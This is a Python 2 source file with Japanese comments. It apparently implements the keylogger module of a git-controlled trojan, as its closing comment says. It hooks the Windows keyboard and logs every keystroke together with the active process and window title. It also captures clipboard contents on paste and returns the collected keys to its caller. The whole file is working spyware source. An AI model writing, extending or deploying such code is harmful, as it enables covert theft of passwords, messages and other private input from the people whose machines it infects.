﻿# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard

# ++++ 追加 ++++
import time
import Queue
import win32api
# ++++ 追加 ++++


user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None


# ++++ 追加 ++++
kl = None
log = None
# ++++ 追加 ++++


def get_current_process():

    # 操作中のウィンドウへのハンドルを取得
    hwnd = user32.GetForegroundWindow()

    # プロセスIDの特定
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 特定したプロセスIDの保存
    process_id = "%d" % pid.value

    # 実行ファイル名の取得
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # ウィンドウのタイトルバーの文字列を取得
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # ヘッダーの出力
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print


    # ハンドルのクローズ
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)



def KeyStroke(event):

    global current_window

    global log    # +追加 

    # 操作中のウィンドウが変わったか確認
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 標準的なキーが押下されたかチェック
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
        log.put(chr(event.Ascii))    # +追加
#        if not log.empty():
#            print log.queue
    else:
        # [Ctrl-V]が押下されたならば、クリップボードのデータを取得
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,
            # ++++ 追加 ++++
            spkey = "[%s]" % event.Key
            log.put(spkey)
            if event.Ascii == 0x0d:
                kl.UnhookKeyboard()
                win32api.PostQuitMessage()
            # ++++ 追加 ++++

    # 登録済みの次のフックに処理を渡す
    return True


# run() メソッドから開始させる
def run(**args):

    # ++++ 追加 ++++
    global kl
    global log

    print"[*] In Keylogger module."

    log = Queue.Queue()
    # ++++ 追加 ++++


    # フックマネージャーの作成と登録
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # フックの登録と実行を継続
    kl.HookKeyboard()
    pythoncom.PumpMessages()

    #print log.queue

    time.sleep(120)

    # ++++ 追加 ++++
    retval = ""
    while not log.empty():
        retval = retval + log.get()

    # print retval
    return retval
    # ++++ 追加 ++++


# ローカルで実行させる場合に必要
# トロイの木馬から git経由で呼び出す場合は、コメントアウトする
#keys = run()
#print keys
